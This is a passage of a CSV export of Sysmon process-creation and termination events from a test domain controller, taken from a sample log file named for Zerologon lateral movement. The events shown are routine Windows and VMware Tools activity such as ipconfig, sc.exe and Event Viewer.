AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9e10-6213-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA256=1D61DD5E920F13D3280B8FFC40BB0C6164D29CAF2220BF526933177D050FC379""},{""@Name"":""ParentProcessGuid"",""#text"":""3b58b388-9e11-6213-0c00-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""784""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\svchost.exe -k DcomLaunch""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
5,5,2022-02-23 09:37:19.8344385,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,TEST\Administrator,,"ProcessID: 2164, ProcessGUID: 3b58b388-004e-6216-6a01-000000000500",,,,,,C:\Users\Administrator\Desktop\Sysmon\Sysmon64.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:37:19.831""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-004e-6216-6a01-000000000500""},{""@Name"":""ProcessId"",""#text"":""2164""},{""@Name"":""Image"",""#text"":""C:\\Users\\Administrator\\Desktop\\Sysmon\\Sysmon64.exe""},{""@Name"":""User"",""#text"":""TEST\\Administrator""}]}}"
6,6,2022-02-23 09:43:46.3204039,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 4524, ProcessGUID: 3b58b388-01d2-6216-7201-000000000500",RuleName: -,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,ParentProcess: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe,"ParentProcessID: 2368, ParentProcessGUID: 3b58b388-9e32-6213-2700-000000000500","ParentCommandLine: ""C:\Program Files\VMware\VMware Tools\vmtoolsd.exe""","C:\Windows\system32\cmd.exe /c """"C:\Program Files\VMware\VMware Tools\resume-vm-default.bat""""",False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:43:46.309""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01d2-6216-7201-000000000500""},{""@Name"":""ProcessId"",""#text"":""4524""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""Windows Command Processor""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""Cmd.Exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\system32\\cmd.exe /c \""\""C:\\Program Files\\VMware\\VMware Tools\\resume-vm-default.bat\""\""""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9e10-6213-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2""},{""@Name"":""ParentProcessGuid"",""#text"":""3b58b388-9e32-6213-2700-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""2368""},{""@Name"":""ParentImage"",""#text"":""C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\""""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
7,7,2022-02-23 09:43:46.3246722,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 5744, ProcessGUID: 3b58b388-01d2-6216-7301-000000000500",RuleName: -,SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0,ParentProcess: C:\Windows\System32\cmd.exe,"ParentProcessID: 4524, ParentProcessGUID: 3b58b388-01d2-6216-7201-000000000500","ParentCommandLine: C:\Windows\system32\cmd.exe /c """"C:\Program Files\VMware\VMware Tools\resume-vm-default.bat""""",\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:43:46.322""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01d2-6216-7301-000000000500""},{""@Name"":""ProcessId"",""#text"":""5744""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\conhost.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""Console Window Host""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""CONHOST.EXE""},{""@Name"":""CommandLine"",""#text"":""\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9e10-6213-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0""},{""@Name"":""ParentProcessGuid"",""#text"":""3b58b388-01d2-6216-7201-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""4524""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\cmd.exe /c \""\""C:\\Program Files\\VMware\\VMware Tools\\resume-vm-default.bat\""\""""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
8,8,2022-02-23 09:43:46.3516659,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 2476, ProcessGUID: 3b58b388-01d2-6216-7401-000000000500",RuleName: -,SHA256=5EE3FD7CA1AC876D0DE539D469BFC333594FCA3DF9F377CC96C756D9648697F1,ParentProcess: C:\Windows\System32\cmd.exe,"ParentProcessID: 4524, ParentProcessGUID: 3b58b388-01d2-6216-7201-000000000500","ParentCommandLine: C:\Windows\system32\cmd.exe /c """"C:\Program Files\VMware\VMware Tools\resume-vm-default.bat""""",C:\Windows\system32\ipconfig  /renew,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:43:46.346""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01d2-6216-7401-000000000500""},{""@Name"":""ProcessId"",""#text"":""2476""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\ipconfig.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""IP Configuration Utility""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""ipconfig.exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\system32\\ipconfig  /renew""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9e10-6213-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA256=5EE3FD7CA1AC876D0DE539D469BFC333594FCA3DF9F377CC96C756D9648697F1""},{""@Name"":""ParentProcessGuid"",""#text"":""3b58b388-01d2-6216-7201-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""4524""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\cmd.exe /c \""\""C:\\Program Files\\VMware\\VMware Tools\\resume-vm-default.bat\""\""""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
9,9,2022-02-23 09:43:46.3601870,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,NT AUTHORITY\SYSTEM,,"ProcessID: 2476, ProcessGUID: 3b58b388-01d2-6216-7401-000000000500",,,,,,C:\Windows\System32\ipconfig.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:43:46.355""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01d2-6216-7401-000000000500""},{""@Name"":""ProcessId"",""#text"":""2476""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\ipconfig.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
10,10,2022-02-23 09:43:46.3623975,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,NT AUTHORITY\SYSTEM,,"ProcessID: 4524, ProcessGUID: 3b58b388-01d2-6216-7201-000000000500",,,,,,C:\Windows\System32\cmd.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:43:46.355""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01d2-6216-7201-000000000500""},{""@Name"":""ProcessId"",""#text"":""4524""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
11,11,2022-02-23 09:43:46.3639474,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,NT AUTHORITY\SYSTEM,,"ProcessID: 5744, ProcessGUID: 3b58b388-01d2-6216-7301-000000000500",,,,,,C:\Windows\System32\conhost.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:43:46.355""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01d2-6216-7301-000000000500""},{""@Name"":""ProcessId"",""#text"":""5744""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\conhost.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
12,12,2022-02-23 09:43:56.0438608,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,TEST\Administrator,,"ProcessID: 4380, ProcessGUID: 3b58b388-01dc-6216-7501-000000000500",RuleName: -,SHA256=EE8364C07B3F4F71FA649E0E6C4C73C15D285130E4B16E79890EEBBF89C2164E,ParentProcess: -,"ParentProcessID: 784, ParentProcessGUID: 00000000-0000-0000-0000-000000000000",ParentCommandLine: -,C:\Windows\system32\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6},False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:43:56.041""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01dc-6216-7501-000000000500""},{""@Name"":""ProcessId"",""#text"":""4380""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\dllhost.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""COM Surrogate""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""dllhost.exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\system32\\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6}""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""TEST\\Administrator""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9fc6-6213-8975-060000000000""},{""@Name"":""LogonId"",""#text"":""0x67589""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""SHA256=EE8364C07B3F4F71FA649E0E6C4C73C15D285130E4B16E79890EEBBF89C2164E""},{""@Name"":""ParentProcessGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""ParentProcessId"",""#text"":""784""},{""@Name"":""ParentImage"",""#text"":""-""},{""@Name"":""ParentCommandLine"",""#text"":""-""},{""@Name"":""ParentUser"",""#text"":""-""}]}}"
13,13,2022-02-23 09:44:01.0602163,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,TEST\Administrator,,"ProcessID: 4380, ProcessGUID: 3b58b388-01dc-6216-7501-000000000500",,,,,,C:\Windows\System32\dllhost.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:44:01.058""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01dc-6216-7501-000000000500""},{""@Name"":""ProcessId"",""#text"":""4380""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\dllhost.exe""},{""@Name"":""User"",""#text"":""TEST\\Administrator""}]}}"
14,14,2022-02-23 09:45:47.8454967,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,NT AUTHORITY\SYSTEM,,"ProcessID: 3240, ProcessGUID: 3b58b388-ff57-6215-6301-000000000500",,,,,,C:\Windows\System32\wbem\WmiPrvSE.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:45:47.839""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-ff57-6215-6301-000000000500""},{""@Name"":""ProcessId"",""#text"":""3240""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\wbem\\WmiPrvSE.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
15,15,2022-02-23 09:46:24.0168866,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 5528, ProcessGUID: 3b58b388-0270-6216-7601-000000000500",RuleName: -,SHA256=8A775B86CE1A057E290CCD26C59C96070684468A3119790743A346CD54F4DFDF,ParentProcess: C:\Windows\System32\svchost.exe,"ParentProcessID: 248, ParentProcessGUID: 3b58b388-9e11-6213-1000-000000000500",ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs,C:\Windows\system32\sc.exe start wuauserv,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:46:24.013""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-0270-6216-7601-000000000500""},{""@Name"":""ProcessId"",""#text"":""5528""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\sc.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""Service Control Manager Configuration Tool""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""sc.exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\system32\\sc.exe start wuauserv""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9e10-6213-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA256=8A775B86CE1A057E290CCD26C59C96070684468A3119790743A346CD54F4DFDF""},{""@Name"":""ParentProcessGuid"",""#text"":""3b58b388-9e11-6213-1000-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""248""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\svchost.exe -k netsvcs""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
16,16,2022-02-23 09:46:24.0237015,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 5300, ProcessGUID: 3b58b388-0270-6216-7701-000000000500",RuleName: -,SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0,ParentProcess: C:\Windows\System32\sc.exe,"ParentProcessID: 5528, ParentProcessGUID: 3b58b388-0270-6216-7601-000000000500",ParentCommandLine: C:\Windows\system32\sc.exe start wuauserv,\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:46:24.020""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-0270-6216-7701-000000000500""},{""@Name"":""ProcessId"",""#text"":""5300""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\conhost.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""Console Window Host""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""CONHOST.EXE""},{""@Name"":""CommandLine"",""#text"":""\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9e10-6213-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0""},{""@Name"":""ParentProcessGuid"",""#text"":""3b58b388-0270-6216-7601-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""5528""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\sc.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\sc.exe start wuauserv""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
17,17,2022-02-23 09:46:24.0398639,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,NT AUTHORITY\SYSTEM,,"ProcessID: 5528, ProcessGUID: 3b58b388-0270-6216-7601-000000000500",,,,,,C:\Windows\System32\sc.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:46:24.027""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-0270-6216-7601-000000000500""},{""@Name"":""ProcessId"",""#text"":""5528""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\sc.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
18,18,2022-02-23 09:46:24.0409181,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,NT AUTHORITY\SYSTEM,,"ProcessID: 5300, ProcessGUID: 3b58b388-0270-6216-7701-000000000500",,,,,,C:\Windows\System32\conhost.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:46:24.027""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-0270-6216-7701-000000000500""},{""@Name"":""ProcessId"",""#text"":""5300""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\conhost.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
19,19,2022-02-23 09:47:42.6462898,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,TEST\Administrator,,"ProcessID: 5044, ProcessGUID: 3b58b388-ffef-6215-6901-000000000500",,,,,,C:\Windows\System32\mmc.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:47:42.636""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-ffef-6215-6901-000000000500""},{""@Name"":""ProcessId"",""#text"":""5044""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\mmc.exe""},{""@Name"":""User"",""#text"":""TEST\\Administrator""}]}}"
20,20,2022-02-23 09:47:45.1703055,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,TEST\Administrator,,"ProcessID: 5212, ProcessGUID: 3b58b388-02c1-6216-7801-000000000500",RuleName: -,SHA256=EE8364C07B3F4F71FA649E0E6C4C73C15D285130E4B16E79890EEBBF89C2164E,ParentProcess: -,"ParentProcessID: 784, ParentProcessGUID: 00000000-0000-0000-0000-000000000000",ParentCommandLine: -,C:\Windows\system32\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6},False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:47:45.168""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-02c1-6216-7801-000000000500""},{""@Name"":""ProcessId"",""#text"":""5212""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\dllhost.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""COM Surrogate""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""dllhost.exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\system32\\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6}""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""TEST\\Administrator""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9fc6-6213-8975-060000000000""},{""@Name"":""LogonId"",""#text"":""0x67589""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""SHA256=EE8364C07B3F4F71FA649E0E6C4C73C15D285130E4B16E79890EEBBF89C2164E""},{""@Name"":""ParentProcessGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""ParentProcessId"",""#text"":""784""},{""@Name"":""ParentImage"",""#text"":""-""},{""@Name"":""ParentCommandLine"",""#text"":""-""},{""@Name"":""ParentUser"",""#text"":""-""}]}}"
21,21,2022-02-23 09:47:48.2667724,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,TEST\Administrator,,"ProcessID: 2712, ProcessGUID: 3b58b388-02c4-6216-7901-000000000500",RuleName: -,SHA256=17DD017B7E7D1DC835CDF5E57156A0FF508EBBC7F4A48E65D77E026C33FCB58E,ParentProcess: C:\Windows\explorer.exe,"ParentProcessID: 2776, ParentProcessGUID: 3b58b388-9fc7-6213-5e00-000000000500",ParentCommandLine: C:\Windows\Explorer.EXE /NOUACCHECK,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s",False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:47:48.257""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-02c4-6216-7901-000000000500""},{""@Name"":""ProcessId"",""#text"":""2712""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\mmc.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""Microsoft Management Console""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""mmc.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\system32\\mmc.exe\"" \""C:\\Windows\\system32\\eventvwr.msc\"" /s""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""TEST\\Administrator""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9fc6-6213-8975-060000000000""},{""@Name"":""LogonId"",""#text"":""0x67589""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""SHA256=17DD017B7E7D1DC835CDF5E57156A0FF508EBBC7F4A48E65D77E026C33FCB58E""},{""@Name"":""ParentProcessGuid"",""#text"":""3b58b388-9fc7-6213-5e00-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""2776""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\explorer.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\Explorer.EXE /NOUACCHECK""},{""@Name"":""ParentUser"",""#text"":""TEST\\Administrator""}]}}"
